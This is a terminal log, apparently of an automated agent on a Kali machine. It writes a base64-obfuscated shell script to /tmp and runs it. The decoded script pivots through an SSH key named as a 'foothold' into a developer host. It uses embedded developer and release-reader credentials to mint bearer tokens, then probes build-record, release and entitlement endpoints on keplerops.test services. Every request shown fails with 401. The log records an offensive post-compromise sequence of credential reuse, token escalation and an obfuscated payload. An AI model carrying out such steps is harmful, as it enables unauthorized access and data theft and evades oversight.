@@ -1,0 +1,153 @@
+└─$ └─$ 
+
+┌──(cinder@kali)-[~]
+└─$ └─$ base64 -d > /tmp/k08rel.sh <<'B64EOF'
+> dGltZW91dCAxMjAgc3NoIC1vIFN0cmljdEhvc3RLZXlDaGVja2luZz1ubyAtbyBDb25uZWN0VGltZW91dD0xMCAtaSB+Ly5zc2gva2VwbGVyb3BzLWZvb3Rob2xkIC1wIDIyMjIgcm93YW5Acm93YW4tZGV2ICcKQ0E9fi8ubG9jYWwvc2hhcmUva2VwbGVyb3BzL2NhLmNydDsgVT1yb3dhbi5pdG86ZmtfZGV2ZWxvcGVyX3lVV1RLU3FyYzE2eTNLNV81RGZRN3FhY2Z0OWItOXhvCkg9ZmtfcmVsZWFzZV9yZWFkZXJfcmZ6MmRkeFJPS3dUNnE5czBZWm5GaWVEZF9OMjFneHMKQz1odHRwczovL2Nsb3VkLWFwaS5rZXBsZXJvcHMudGVzdDsgRD1odHRwczovL2RlbGl2ZXJ5LmtlcGxlcm9wcy50ZXN0Ojg0NDMKV1Q9JChjdXJsIC1zUyAtLWNhY2VydCAkQ0EgLXUgIiRVIiAtWCBQT1NUIC1IICJDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL2pzb24iIC1kICJ7fSIgIiRDL2FwaS93b3Jrc3BhY2VzL2N1cnJlbnQvdG9rZW4tZXhjaGFuZ2UiIHwgcHl0aG9uMyAtYyAiaW1wb3J0IHN5cyxqc29uO3ByaW50KGpzb24ubG9hZChzeXMuc3RkaW4pW1wiYWNjZXNzX3Rva2VuXCJdKSIpClJUPSQoY3VybCAtc1MgLS1jYWNlcnQgJENBIC1IICJBdXRob3JpemF0aW9uOiBCZWFyZXIgJFdUIiAtSCAiQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi9qc29uIiAtZCAie1wiZXhjaGFuZ2VfaGFuZGxlXCI6XCIkSFwifSIgIiRDL2FwaS90b2tlbi1leGNoYW5nZS9yZWxlYXNlLXJlYWRlciIgfCBweXRob24zIC1jICJpbXBvcnQgc3lzLGpzb247cHJpbnQoanNvbi5sb2FkKHN5cy5zdGRpbilbXCJhY2Nlc3NfdG9rZW5cIl0pIikKZWNobyAiUlQgbGVuICR7I1JUfSIKZWNobyAiPT09IGNsb3VkIGJ1aWxkIHJlY29yZCB3aXRoIFJUID09PSI7IGN1cmwgLXNTIC0tY2FjZXJ0ICRDQSAtSCAiQXV0aG9yaXphdGlvbjogQmVhcmVyICRSVCIgLWkgIiRDL2FwaS9idWlsZC1yZWNvcmRzL0JMRC1SRUwtNzQyIiB8IGhlYWQgLTMwOyBlY2hvCmZvciBSIGluIEJMRC1SRUwtNzQyIEZMSy02LjkuOCBNVE4tNi45LjggNi45LjggRU5ULUFSV0MtRElBRy0wNjk4IFJFTC02LjkuOCByZWxlYXNlLTYuOS44IEZMSy02OTggRElBRy1DUlItTUlYRUQtMTkgUjE5OyBkbwogZWNobyAiPT09IGRlbGl2ZXJ5IHJlbGVhc2UgJFIgPT09IjsgY3VybCAtc1MgLS1jYWNlcnQgJENBIC1IICJBdXRob3JpemF0aW9uOiBCZWFyZXIgJFJUIiAtaSAiJEQvYXBpL3JlbGVhc2VzLyRSIiB8IGhlYWQgLTMwOyBlY2hvCmRvbmUKZWNobyAiPT09IGRlbGl2ZXJ5IGVudGl0bGVtZW50IHdpdGggUlQgPT09IjsgY3VybCAtc1MgLS1jYWNlcnQgJENBIC1IICJBdXRob3JpemF0aW9uOiBCZWFyZXIgJFJUIiAtaSAiJEQvYXBpL2NvbXBhdGliaWxpdHkvZW50aXRsZW1lbnRzL0VOVC1BUldDLURJQUctMDY5OCIgfCBoZWFkIC0yNQonIDI+JjEgfCBoZWFkIC0zMDAK
+> B64EOF
+
+┌──(cinder@kali)-[~]
+└─$ └─$ chmod +x /tmp/k08rel.sh; bash /tmp/k08rel.sh; echo DONEMARK_1795208475052$((6*7))
+RT len 978
+=== cloud build record with RT ===
+HTTP/1.1 401 Unauthorized
+Server: nginx
+Date: Fri, 20 Nov 2026 21:01:25 GMT
+Content-Type: application/json
+Content-Length: 36
+Connection: keep-alive
+X-Content-Type-Options: nosniff
+X-Request-ID: 2901c521-6553-4231-8857-63e0d445f89a
+
+{"error":"authentication_required"}
+
+=== delivery release BLD-REL-742 ===
+HTTP/1.1 401 Unauthorized
+Server: nginx
+Date: Fri, 20 Nov 2026 21:01:25 GMT
+Content-Type: application/json
+Content-Length: 36
+Connection: keep-alive
+X-Content-Type-Options: nosniff
+X-Request-ID: 3a66db03-bc00-4d2d-b561-8cf2a91363d7
+
+{"error":"authentication_required"}
+
+=== delivery release FLK-6.9.8 ===
+HTTP/1.1 401 Unauthorized
+Server: nginx
+Date: Fri, 20 Nov 2026 21:01:25 GMT
+Content-Type: application/json
+Content-Length: 36
+Connection: keep-alive
+X-Content-Type-Options: nosniff
+X-Request-ID: 37fb2c2e-aa72-4723-9439-f8498f3c4505
+
+{"error":"authentication_required"}
+
+=== delivery release MTN-6.9.8 ===
+HTTP/1.1 401 Unauthorized
+Server: nginx
+Date: Fri, 20 Nov 2026 21:01:25 GMT
+Content-Type: application/json
+Content-Length: 36
+Connection: keep-alive
+X-Content-Type-Options: nosniff
+X-Request-ID: 538879ed-f9ca-4511-bcde-6c114ae03009
+
+{"error":"authentication_required"}
+
+=== delivery release 6.9.8 ===
+HTTP/1.1 401 Unauthorized
+Server: nginx
+Date: Fri, 20 Nov 2026 21:01:25 GMT
+Content-Type: application/json
+Content-Length: 36
+Connection: keep-alive
+X-Content-Type-Options: nosniff
+X-Request-ID: 76ce31d1-f281-472f-96f8-ca3d4876b466
+
+{"error":"authentication_required"}
+
+=== delivery release ENT-ARWC-DIAG-0698 ===
+HTTP/1.1 401 Unauthorized
+Server: nginx
+Date: Fri, 20 Nov 2026 21:01:25 GMT
+Content-Type: application/json
+Content-Length: 36
+Connection: keep-alive
+X-Content-Type-Options: nosniff
+X-Request-ID: e3fd8cd1-279b-4654-8823-2d14b76e49d1
+
+{"error":"authentication_required"}
+
+=== delivery release REL-6.9.8 ===
+HTTP/1.1 401 Unauthorized
+Server: nginx
+Date: Fri, 20 Nov 2026 21:01:25 GMT
+Content-Type: application/json
+Content-Length: 36
+Connection: keep-alive
+X-Content-Type-Options: nosniff
+X-Request-ID: 3c3e1e56-6ebc-4466-a442-8736955dc398
+
+{"error":"authentication_required"}
+
+=== delivery release release-6.9.8 ===
+HTTP/1.1 401 Unauthorized
+Server: nginx
+Date: Fri, 20 Nov 2026 21:01:25 GMT
+Content-Type: application/json
+Content-Length: 36
+Connection: keep-alive
+X-Content-Type-Options: nosniff
+X-Request-ID: 774b8b27-726e-415f-a1ad-b59b0a75c2bd
+
+{"error":"authentication_required"}
+
+=== delivery release FLK-698 ===
+HTTP/1.1 401 Unauthorized
+Server: nginx
+Date: Fri, 20 Nov 2026 21:01:25 GMT
+Content-Type: application/json
+Content-Length: 36
+Connection: keep-alive
+X-Content-Type-Options: nosniff
+X-Request-ID: 57cb4da7-0248-4274-80b7-741ceb8989bc
+
+{"error":"authentication_required"}
+
+=== delivery release DIAG-CRR-MIXED-19 ===
+HTTP/1.1 401 Unauthorized
+Server: nginx
+Date: Fri, 20 Nov 2026 21:01:25 GMT
+Content-Type: application/json
+Content-Length: 36
+Connection: keep-alive
+X-Content-Type-Options: nosniff
+X-Request-ID: ea28f5e8-5a28-41a0-b5ef-13b6d306a8ed
+
+{"error":"authentication_required"}
+
+=== delivery release R19 ===
+HTTP/1.1 401 Unauthorized
+Server: nginx
+Date: Fri, 20 Nov 2026 21:01:25 GMT
+Content-Type: application/json
+Content-Length: 36
+Connection: keep-alive
+X-Content-Type-Options: nosniff
+X-Request-ID: ae048e51-1f40-4135-8aae-00592133541c
+
+{"error":"authentication_required"}
+
+=== delivery entitlement with RT ===
+HTTP/1.1 401 Unauthorized
+Server: nginx
+Date: Fri, 20 Nov 2026 21:01:25 GMT
+Content-Type: application/json
+Content-Length: 36
+Connection: keep-alive
+X-Content-Type-Options: nosniff
+X-Request-ID: 1d403ff5-4180-41a1-b40d-f5d55a919905
+
+{"error":"authentication_required"}
